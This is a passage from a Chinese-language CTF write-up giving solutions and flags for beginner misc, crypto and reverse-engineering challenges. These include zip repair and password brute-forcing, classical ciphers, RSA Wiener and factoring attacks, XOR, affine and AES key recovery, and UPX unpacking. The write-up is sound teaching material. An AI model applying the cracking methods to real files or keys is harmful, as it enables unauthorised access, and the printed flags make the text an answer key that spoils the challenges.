+</span></code></pre><h3 id=week-1-liu-liang-sha-yu>[Week 1]流量！鲨鱼！<a aria-label="Anchor link for: week-1-liu-liang-sha-yu" class=zola-anchor href=#week-1-liu-liang-sha-yu style=visibility:hidden></a></h3><p>用 WireShark 打开后在过滤器中输入 <code>http.response.code==200</code> 可以得到所有成功访问的 http 请求。<p>通过一个一个看可以发现一个特殊的请求，如下图<p>可以发现这是请求 flag 并且将 flag 以 base64 编码的形态输出，通过将值进行 base64 解码即可得到 flag。<pre class=z-code><code><span class="z-text z-plain">flag{Wri35h4rk_1s_u53ful_b72a609537e6}
+</span></code></pre><h3 id=week-1-ya-suo-bao-men>[Week 1]压缩包们<a aria-label="Anchor link for: week-1-ya-suo-bao-men" class=zola-anchor href=#week-1-ya-suo-bao-men style=visibility:hidden></a></h3><p>通过 binwalk 可以知道这是个 zip 压缩包，用 010 打开后发现缺少了文件头，需要进行修改，如下图。<p>修改后将后缀名修改为 zip ，解压得到 flag.zip 但打开压缩包会提示压缩包数据错误 - 该文件已损坏，再看看全局方式位标记是否有错。<blockquote><p>https://mp.weixin.qq.com/s?__biz=MzAwNDcwMDgzMA==&mid=2651042332&idx=7&sn=ff5bb33bb0f49470a9140976d9ced3fa</blockquote><p>通过 010 可以看到压缩源文件数据的全局方式位标记为 <code>09 00</code> ，压缩源文件目录区的全局方式位标记 <code>00 00</code> ，将压缩源文件目录区的全局方式位标记也修改为 <code>09 00</code> 再打开压缩包发现压缩包正常了。<p>在压缩包注释中存在一串 base64 编码内容如下<pre class=z-code><code><span class="z-text z-plain">SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==
+</span></code></pre><p>解码内容如下<pre class=z-code><code><span class="z-text z-plain">I like six-digit numbers because they are very concise and easy to remember.
+</span></code></pre><p>说明密码应该为 6 个数字，用 ARCHPR 进行爆破即可得到密码为 <code>232311</code> ，解压后即可得到 flag<pre class=z-code><code><span class="z-text z-plain">flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}
+</span></code></pre><h3 id=week-1-kong-bai-ge>[Week 1]空白格<a aria-label="Anchor link for: week-1-kong-bai-ge" class=zola-anchor href=#week-1-kong-bai-ge style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">  
+</span></code></pre><p>使用 VSCode 打开可以发现这是由 <code>换行符</code> 、<code>制表符</code> 和 <code>空格</code> 组成的内容，通过百度发现是 whitespace 语言。<blockquote><p>https://www.w3cschool.cn/tryrun/runcode?lang=whitespace</blockquote><p>通过在线工具即可得到 flag 如下<pre class=z-code><code><span class="z-text z-plain">flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}
+</span></code></pre><h3 id=week-1-yin-mi-de-yan-jing>[Week 1]隐秘的眼睛<a aria-label="Anchor link for: week-1-yin-mi-de-yan-jing" class=zola-anchor href=#week-1-yin-mi-de-yan-jing style=visibility:hidden></a></h3><p>使用 SilentEye 进行 Decode 即可得到 flag，密钥用的是默认的。<pre class=z-code><code><span class="z-text z-plain">flag{R0ck1ng_y0u_63b0dc13a591}
+</span></code></pre><h3 id=week-2-xin-jian-wordwen-dang>[Week 2]新建Word文档<a aria-label="Anchor link for: week-2-xin-jian-wordwen-dang" class=zola-anchor href=#week-2-xin-jian-wordwen-dang style=visibility:hidden></a></h3><p>http://hi.pcmoe.net/buddha.html<h2 id=crypto>Crypto<a aria-label="Anchor link for: crypto" class=zola-anchor href=#crypto style=visibility:hidden></a></h2><h3 id=week-1-brainfuck>[Week 1]brainfuck<a aria-label="Anchor link for: week-1-brainfuck" class=zola-anchor href=#week-1-brainfuck style=visibility:hidden></a></h3><p>密文如下<pre class=z-code><code><span class="z-text z-plain">++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<&LT-]>>>>>>>++++++.>----.&LT-----.>-----.>-----.<<&LT-.>>++..<.>.++++++.....------.<.>.<<<<<+++.>>>>+.<<<+++++++.>>>+.<<&LT-------.>>>-.<<<+.+++++++.--..>>>>---.-.<<<&LT-.+++.>>>>.<<<&LT-------.+.>>>>>++.
+</span></code></pre><blockquote><p>https://www.splitbrain.org/services/ook</blockquote><pre class=z-code><code><span class="z-text z-plain">flag{Oiiaioooooiai#b7c0b1866fe58e12}
+</span></code></pre><h3 id=week-1-caesar-s-secert>[Week 1]Caesar’s Secert<a aria-label="Anchor link for: week-1-caesar-s-secert" class=zola-anchor href=#week-1-caesar-s-secert style=visibility:hidden></a></h3><p>密文如下<pre class=z-code><code><span class="z-text z-plain">kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}
+</span></code></pre><blockquote><p>https://www.dcode.fr/caesar-cipher</blockquote><pre class=z-code><code><span class="z-text z-plain">flag{ca3s4r's_c1pher_i5_v4ry_3azy}
+</span></code></pre><h3 id=week-1-fence>[Week 1]Fence<a aria-label="Anchor link for: week-1-fence" class=zola-anchor href=#week-1-fence style=visibility:hidden></a></h3><p>密文如下<pre class=z-code><code><span class="z-text z-plain">fa{ereigtepanet6680}lgrodrn_h_litx#8fc3
+</span></code></pre><p>栅栏密码，使用 CyberChef 可以解出来<pre class=z-code><code><span class="z-text z-plain">#recipe=Rail_Fence_Cipher_Decode(2,0)&input=ZmF7ZXJlaWd0ZXBhbmV0NjY4MH1sZ3JvZHJuX2hfbGl0eCM4ZmMz
+</span></code></pre><pre class=z-code><code><span class="z-text z-plain">flag{reordering_the_plaintext#686f8c03}
+</span></code></pre><h3 id=week-1-vigenere>[Week 1]Vigenère<a aria-label="Anchor link for: week-1-vigenere" class=zola-anchor href=#week-1-vigenere style=visibility:hidden></a></h3><p>密文如下<pre class=z-code><code><span class="z-text z-plain">pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}
+</span></code></pre><blockquote><p>https://www.dcode.fr/vigenere-cipher</blockquote><p>维吉尼亚密码解密，将密文丢进上述链接中，并设置<pre class=z-code><code><span class="z-text z-plain">Knowing a plaintext word: flag{
+</span></code></pre><p>可以发现当 Key 前三位为 <code>KFC</code> 时存在 <code>flag{</code> ，故尝试让 Key 就等于 <code>KFC</code> ，发现就是 flag。<pre class=z-code><code><span class="z-text z-plain">flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}
+</span></code></pre><h3 id=week-1-babyencoding>[Week 1]babyencoding<a aria-label="Anchor link for: week-1-babyencoding" class=zola-anchor href=#week-1-babyencoding style=visibility:hidden></a></h3><p>密文如下<pre class=z-code><code><span class="z-text z-plain">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=
+</span><span class="z-text z-plain">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=
+</span><span class="z-text z-plain">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&LTR-C`Q9F8S87T`
+</span></code></pre><p>前两个用 CyberChef 可以一把梭，结果如下。<pre class=z-code><code><span class="z-text z-plain">part 1 of flag: flag{dazzling_encoding#4e0ad4
+</span><span class="z-text z-plain">part 2 of flag: f0ca08d1e1d0f10c0c7afe422fea7
+</span></code></pre><p>第三部分使用的是 UUEncode 编码<blockquote><p>http://www.atoolbox.net/Tool.php?Id=731</blockquote><p>解密后可以得到第三部分<pre class=z-code><code><span class="z-text z-plain">part 3 of flag: c55192c992036ef623372601ff3a}
+</span></code></pre><h3 id=week-1-small-d>[Week 1]Small d<a aria-label="Anchor link for: week-1-small-d" class=zola-anchor href=#week-1-small-d style=visibility:hidden></a></h3><blockquote><p>https://github.com/pablocelayes/rsa-wiener-attack</blockquote><p>题目中的 e 很大，说明 d 就会很小，通过 Wiener 攻击来解出 d。<pre class=z-code><code><span class="z-text z-plain">from Crypto.Util.number import long_to_bytes
+</span><span class="z-text z-plain">from RSAwienerHacker import hack_RSA
+</span><span class="z-text z-plain">e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825
+</span><span class="z-text z-plain">n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433
+</span><span class="z-text z-plain">c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248
+</span><span class="z-text z-plain">d = hack_RSA(e, n)
+</span><span class="z-text z-plain">print(d)
+</span><span class="z-text z-plain">m = pow(c, d, n)
+</span><span class="z-text z-plain">print(long_to_bytes(m))
+</span></code></pre><h3 id=week-1-babyrsa>[Week 1]babyrsa<a aria-label="Anchor link for: week-1-babyrsa" class=zola-anchor href=#week-1-babyrsa style=visibility:hidden></a></h3><blockquote><p>题目描述：很容易分解的n<p>http://factordb.com/</blockquote><p>题目描述中给出 hint ，通过 factordb 分解 n ，可以得到以下数组。<pre class=z-code><code><span class="z-text z-plain">array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
+</span></code></pre><p>分解所得均为素数，通过计算出 phi 即可得出结果。<pre class=z-code><code><span class="z-text z-plain">import gmpy2
+</span><span class="z-text z-plain">from Crypto.Util.number import long_to_bytes, isPrime
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261
+</span><span class="z-text z-plain">e = 65537
+</span><span class="z-text z-plain">c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">phi = 1
+</span><span class="z-text z-plain">for p in array_p:
+</span><span class="z-text z-plain">    if isPrime(p):
+</span><span class="z-text z-plain">        phi *= (p - 1)
+</span><span class="z-text z-plain">    else:
+</span><span class="z-text z-plain">        exit(1)
+</span><span class="z-text z-plain">d = gmpy2.invert(e, phi)
+</span><span class="z-text z-plain">m = pow(c, d, n)
+</span><span class="z-text z-plain">print(long_to_bytes(m))
+</span></code></pre><h3 id=week-1-babyxor>[Week 1]babyxor<a aria-label="Anchor link for: week-1-babyxor" class=zola-anchor href=#week-1-babyxor style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">from secret import *
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">ciphertext = []
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">for f in flag:
+</span><span class="z-text z-plain">    ciphertext.append(f ^ key)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">print(bytes(ciphertext).hex())
+</span><span class="z-text z-plain"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2
+</span></code></pre><p>知道明文前五位为 <code>flag{</code> ，通过异或密文前五位来得出 <code>key</code> ，python 脚本如下<pre class=z-code><code><span class="z-text z-plain">ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
+</span><span class="z-text z-plain">ciphertext = bytes.fromhex(ciphertext_hex)
+</span><span class="z-text z-plain">known_plaintext = b"flag{"
+</span><span class="z-text z-plain">partial_key = [ciphertext[i] ^ known_plaintext[i] for i in range(5)]
+</span><span class="z-text z-plain">print("Partial key:", bytes(partial_key))
+</span><span class="z-text z-plain"># Partial key: b'\x8f\x8f\x8f\x8f\x8f'
+</span></code></pre><p>可以得出 key 为 <code>\x8f</code> ，通过遍历异或整串密文就可以得到 flag，脚本如下<pre class=z-code><code><span class="z-text z-plain">ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
+</span><span class="z-text z-plain">ciphertext = bytes.fromhex(ciphertext_hex)
+</span><span class="z-text z-plain">key = int.from_bytes(b'\x8f', 'big')
+</span><span class="z-text z-plain">print(bytes([ciphertext[i] ^ key for i in range(36)]))
+</span></code></pre><h3 id=week-1-affine>[Week 1]Affine<a aria-label="Anchor link for: week-1-affine" class=zola-anchor href=#week-1-affine style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">from flag import flag, key
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">modulus = 256
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">ciphertext = []
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">for f in flag:
+</span><span class="z-text z-plain">    ciphertext.append((key[0]*f + key[1]) % modulus)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">print(bytes(ciphertext).hex())
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064
+</span></code></pre><p>通过将明文的每个字符与 <code>key[0]</code> 相乘再加上 <code>key[1]</code> 模 256即可得到密文，因此把过程倒过来即可得到 flag。<p>加密过程: $(key[0] * f + key[1])\ mod\ 256$<p>因为进行模运算，逆过来需要先求出逆元，通过求出逆元就可以逆推得出 flag。<p>解密过程: $key[0]^{-1} * (c-key[1])\ mod\ 256 $<p>根据已知明文 <code>flag{</code> 爆破出逆元后通过解出的 <code>key[0]</code> 和 <code>key[1]</code> 代入求解即可，脚本如下<pre class=z-code><code><span class="z-text z-plain">def mod_inverse(a, m):
+</span><span class="z-text z-plain">    for x in range(1, m):
+</span><span class="z-text z-plain">        if (a * x) % m == 1:
+</span><span class="z-text z-plain">            return x
+</span><span class="z-text z-plain">    return None
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">ciphertext = bytes.fromhex("dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064")
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">known_text = b"flag{"
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">for k0 in range(256):
+</span><span class="z-text z-plain">    for k1 in range(256):
+</span><span class="z-text z-plain">        inv_k0 = mod_inverse(k0, 256)
+</span><span class="z-text z-plain">        if not inv_k0:
+</span><span class="z-text z-plain">            continue
+</span><span class="z-text z-plain">        decrypted = [(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(known_text)]]
+</span><span class="z-text z-plain">        if bytes(decrypted) == known_text:
+</span><span class="z-text z-plain">            print(bytes([(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(ciphertext)]]))
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">            
+</span><span class="z-text z-plain"># flag{4ff1ne_c1pher_i5_very_3azy}
+</span></code></pre><h3 id=week-1-babyaes>[Week 1]babyaes<a aria-label="Anchor link for: week-1-babyaes" class=zola-anchor href=#week-1-babyaes style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">from Crypto.Cipher import AES
+</span><span class="z-text z-plain">import os
+</span><span class="z-text z-plain">from flag import flag
+</span><span class="z-text z-plain">from Crypto.Util.number import *
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def pad(data):
+</span><span class="z-text z-plain">    return data + b"".join([b'\x00' for _ in range(0, 16 - len(data))])
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def main():
+</span><span class="z-text z-plain">    flag_ = pad(flag)
+</span><span class="z-text z-plain">    key = os.urandom(16) * 2
+</span><span class="z-text z-plain">    iv = os.urandom(16)
+</span><span class="z-text z-plain">    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)
+</span><span class="z-text z-plain">    aes = AES.new(key, AES.MODE_CBC, iv)
+</span><span class="z-text z-plain">    enc_flag = aes.encrypt(flag_)
+</span><span class="z-text z-plain">    print(enc_flag)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if __name__ == "__main__":
+</span><span class="z-text z-plain">    main()
+</span><span class="z-text z-plain"># 3657491768215750635844958060963805125333761387746954618540958489914964573229
+</span><span class="z-text z-plain"># b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'
+</span></code></pre><p>由于 key 是由一段随机 16bit 的值复制两次拼接出来的值，并且给出了 $key\ \oplus\ iv\ \oplus\ 1$ 的值，因此可以先异或 1 得到 $key\ \oplus\ iv$ 的值。<p>由于此时的 key 为 32bit，而 iv 为 16bit，因此解出来的值得前半段就是 key 值，再通过将前半段异或后半段即可得到 iv 值，脚本如下<pre class=z-code><code><span class="z-text z-plain">xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
+</span><span class="z-text z-plain">xor_result_bytes = long_to_bytes(xor_result ^ 1)
+</span><span class="z-text z-plain">key = xor_result_bytes[:16] * 2
+</span><span class="z-text z-plain">print(f'key = {key}')
+</span><span class="z-text z-plain">iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
+</span><span class="z-text z-plain">print(f'iv = {iv}')
+</span><span class="z-text z-plain"># key = b'\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,\x08\x16\x11%\xa0\xa6\xc5\xcb^\x02\x99NF`\xea,'
+</span><span class="z-text z-plain"># iv = b'\xe3Z\x19Ga>\x07\xcc\xd1\xa1X\x01c\x11\x16\x00'
+</span></code></pre><p>将解出的 key 和 iv 丢进 AES 中进行解密即可得到 flag，完整脚本如下<pre class=z-code><code><span class="z-text z-plain">from Crypto.Cipher import AES
+</span><span class="z-text z-plain">from Crypto.Util.number import *
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
+</span><span class="z-text z-plain">enc_flag = b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">xor_result_bytes = long_to_bytes(xor_result ^ 1)
+</span><span class="z-text z-plain">print(xor_result_bytes)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">key = xor_result_bytes[:16] * 2
+</span><span class="z-text z-plain">print(f'key = {key}')
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">iv = long_to_bytes(bytes_to_long(xor_result_bytes[:16]) ^ bytes_to_long(xor_result_bytes[16:]))
+</span><span class="z-text z-plain">print(f'iv = {iv}')
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">aes = AES.new(key, AES.MODE_CBC, iv)
+</span><span class="z-text z-plain">dec_flag = aes.decrypt(enc_flag)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">print(dec_flag)
+</span><span class="z-text z-plain"># b'firsT_cry_Aes\x00\x00\x00'
+</span></code></pre><h2 id=reverse>Reverse<a aria-label="Anchor link for: reverse" class=zola-anchor href=#reverse style=visibility:hidden></a></h2><h3 id=week-1-easy-re>[Week 1]easy_RE<a aria-label="Anchor link for: week-1-easy-re" class=zola-anchor href=#week-1-easy-re style=visibility:hidden></a></h3><p>用 ida64 打开可以得到前半部分 flag ，如下图<p>通过按 F5 反编译可以得到后半部分 flag ，如下图<p>故 flag 如下<pre class=z-code><code><span class="z-text z-plain">flag{we1c0me_to_rev3rse!!}}
+</span></code></pre><h3 id=week-1-ke>[Week 1]咳<a aria-label="Anchor link for: week-1-ke" class=zola-anchor href=#week-1-ke style=visibility:hidden></a></h3><p>题目描述中存在壳，用查壳软件看看，如下图<p><img src="https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FjJRCfmdtbKA2NAxc3iF8%252F%25E5%2592%25B3-1.png%3Falt%3Dmedia%26token%3D8388cf8a-b1de-4ec0-a465-2792fded509c&width=768&dpr=4&quality=100&sign=b315f35440a8f65852bc75987e8558f820e38fb7226319e7522eabe240a6f58c" alt=img><p>需要使用 upx 去壳，如下<pre class=z-code><code><span class="z-text z-plain">$ upx -d "KE.exe"
+</span><span class="z-text z-plain">                       Ultimate Packer for eXecutables
+</span><span class="z-text z-plain">                           right (C) 1996 - 2020
+</span><span class="z-text z-plain">UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">        File size         Ratio      Format      Name
+</span><span class="z-text z-plain">   --------------------   ------   -----------   -----------
+</span><span class="z-text z-plain">    133760 &LT-     68224   51.00%    win64/pe     KE.exe
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Unpacked 1 file.
+</span></code></pre><p>去壳完成后用 ida64 打开，通过反编译可以得到以下内容<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
+</span><span class="z-text z-plain">{
+</span><span class="z-text z-plain">  unsigned __int64 i; // r10
+</span><span class="z-text z-plain">  char *v4; // kr00_8
+</span><span class="z-text z-plain">  char Str1[96]; // [rsp+20h] [rbp-88h] BYREF
+</span><span class="z-text z-plain">  int v7; // [rsp+80h] [rbp-28h]
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  _main();
+</span><span class="z-text z-plain">  memset(Str1, 0, sizeof(Str1));
+</span><span class="z-text z-plain">  v7 = 0;
+</span><span class="z-text z-plain">  Hello();
+</span><span class="z-text z-plain">  scanf("%s", Str1);
+</span><span class="z-text z-plain">  for ( i = 0i64; ; ++i )
+</span><span class="z-text z-plain">  {
+</span><span class="z-text z-plain">    v4 = &Str1[strlen(Str1)];
+</span><span class="z-text z-plain">    if ( i >= v4 - Str1 )
+</span><span class="z-text z-plain">      break;
+</span><span class="z-text z-plain">    ++Str1[i];
+</span><span class="z-text z-plain">  }
+</span><span class="z-text z-plain">  if ( !strncmp(Str1, enc, v4 - Str1) )
+</span><span class="z-text z-plain">    puts("WOW!!");
+</span><span class="z-text z-plain">  else
+</span><span class="z-text z-plain">    puts("I believe you can do it!");
+</span><span class="z-text z-plain">  system("pause");
+</span><span class="z-text z-plain">  return 0;
+</span><span class="z-text z-plain">}
+</span></code></pre><p>并且可以找到<pre class=z-code><code><span class="z-text z-plain">enc = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
+</span></code></pre><p>通过分析可得该函数将密文是由明文的每个字符转ascii值后加一得到的，要得到明文则将每个字符的ascii值减一即可。<pre class=z-code><code><span class="z-text z-plain">str = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
+</span><span class="z-text z-plain">for s in str:
+</span><span class="z-text z-plain">    print(chr(ord(s) - 1), end='')
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain"># flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1}
+</span></code></pre><h3 id=week-1-segments>[Week 1]Segments<a aria-label="Anchor link for: week-1-segments" class=zola-anchor href=#week-1-segments style=visibility:hidden></a></h3><p>百度 <code>IDA的Segments窗口要怎么打开呢</code> ，可以得到结果 <code>Shift+F7</code> ，将 Segments 窗口中的 name 拼凑起来就是 flag。<pre class=z-code><code><span class="z-text z-plain">flag{You_ar3_g0od_at_f1nding_ELF_segments_name}
+</span></code></pre><h3 id=week-1-elf>[Week 1]ELF<a aria-label="Anchor link for: week-1-elf" class=zola-anchor href=#week-1-elf style=visibility:hidden></a></h3><p>用 ida64 打开，通过反编译可以得到以下内容<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
+</span><span class="z-text z-plain">{
+</span><span class="z-text z-plain">  unsigned int v3; // edx
+</span><span class="z-text z-plain">  char *s1; // [rsp+0h] [rbp-20h]
+</span><span class="z-text z-plain">  char *v6; // [rsp+8h] [rbp-18h]
+</span><span class="z-text z-plain">  char *s; // [rsp+10h] [rbp-10h]
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  s = (char *)malloc(0x64uLL);
+</span><span class="z-text z-plain">  printf("Input flag: ");
+</span><span class="z-text z-plain">  fgets(s, 100, stdin);
+</span><span class="z-text z-plain">  s[strcspn(s, "\n")] = 0;
+</span><span class="z-text z-plain">  v6 = (char *)encode(s);
+</span><span class="z-text z-plain">  v3 = strlen(v6);
+</span><span class="z-text z-plain">  s1 = (char *)base64_encode(v6, v3);
+</span><span class="z-text z-plain">  if ( !strcmp(s1, "VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t") )
+</span><span class="z-text z-plain">    puts("Correct");
+</span><span class="z-text z-plain">  else
+</span><span class="z-text z-plain">    puts("Wrong");
+</span><span class="z-text z-plain">  free(v6);
+</span><span class="z-text z-plain">  free(s1);
+</span><span class="z-text z-plain">  free(s);
+</span><span class="z-text z-plain">  return 0;
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">_BYTE *__fastcall encode(const char *a1)
+</span><span class="z-text z-plain">{
+</span><span class="z-text z-plain">  size_t v1; // rax
+</span><span class="z-text z-plain">  int v2; // eax
+</span><span class="z-text z-plain">  _BYTE *v4; // [rsp+20h] [rbp-20h]
+</span><span class="z-text z-plain">  int i; // [rsp+28h] [rbp-18h]
+</span><span class="z-text z-plain">  int v6; // [rsp+2Ch] [rbp-14h]
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  v1 = strlen(a1);
+</span><span class="z-text z-plain">  v4 = malloc(2 * v1 + 1);
+</span><span class="z-text z-plain">  v6 = 0;
+</span><span class="z-text z-plain">  for ( i = 0; i < strlen(a1); ++i )
+</span><span class="z-text z-plain">  {
+</span><span class="z-text z-plain">    v2 = v6++;
+</span><span class="z-text z-plain">    v4[v2] = (a1[i] ^ 0x20) + 16;
+</span><span class="z-text z-plain">  }
+</span><span class="z-text z-plain">  v4[v6] = 0;
+</span><span class="z-text z-plain">  return v4;
+</span><span class="z-text z-plain">}
+</span></code></pre><p>通过分析可知密文是由明文的每个字符与 0x20 进行异或后加 16 并进行 base64 编码得到的，要得到明文则先进行 base64 解码后将所得的每个位减去 16 再和 0x20 异或即可，脚本如下。<pre class=z-code><code><span class="z-text z-plain">import base64
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">encoded_str = "VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t"
+</span><span class="z-text z-plain">decoded_bytes = base64.b64decode(encoded_str)
+</span><span class="z-text z-plain">print(decoded_bytes)
+</span><span class="z-text z-plain">for s in decoded_bytes:
+</span><span class="z-text z-plain">    print(chr((s - 16) ^ 0x20), end="")
+</span><span class="z-text z-plain">    
+</span><span class="z-text z-plain"># flag{D0_4ou_7now_wha7_ELF_1s?}
+</span></code></pre><h3 id=week-1-endian>[Week 1]Endian<a aria-label="Anchor link for: week-1-endian" class=zola-anchor href=#week-1-endian style=visibility:hidden></a></h3><p>用 ida64 打开，通过反编译可以得到以下内容<pre class=z-code><code><span class="z-text z-plain">int __cdecl main(int argc, const char **argv, const char **envp)
+</span><span class="z-text z-plain">{
+</span><span class="z-text z-plain">  int i; // [rsp+4h] [rbp-3Ch]
+</span><span class="z-text z-plain">  char *v5; // [rsp+8h] [rbp-38h]
+</span><span class="z-text z-plain">  char v6[40]; // [rsp+10h] [rbp-30h] BYREF
+</span><span class="z-text z-plain">  unsigned __int64 v7; // [rsp+38h] [rbp-8h]
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">  v7 = __readfsqword(0x28u);
+</span><span class="z-text z-plain">  puts("please input your flag");
+</span><span class="z-text z-plain">  __isoc99_scanf("%s", v6);
+</span><span class="z-text z-plain">  v5 = v6;
+</span><span class="z-text z-plain">  for ( i = 0; i <= 4; ++i )
+</span><span class="z-text z-plain">  {
+</span><span class="z-text z-plain">    if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) )
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">      printf("wrong!");
+</span><span class="z-text z-plain">      exit(0);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    v5 += 4;
+</span><span class="z-text z-plain">  }
+</span><span class="z-text z-plain">  printf("you are right");
+</span><span class="z-text z-plain">  return 0;
+</span><span class="z-text z-plain">}
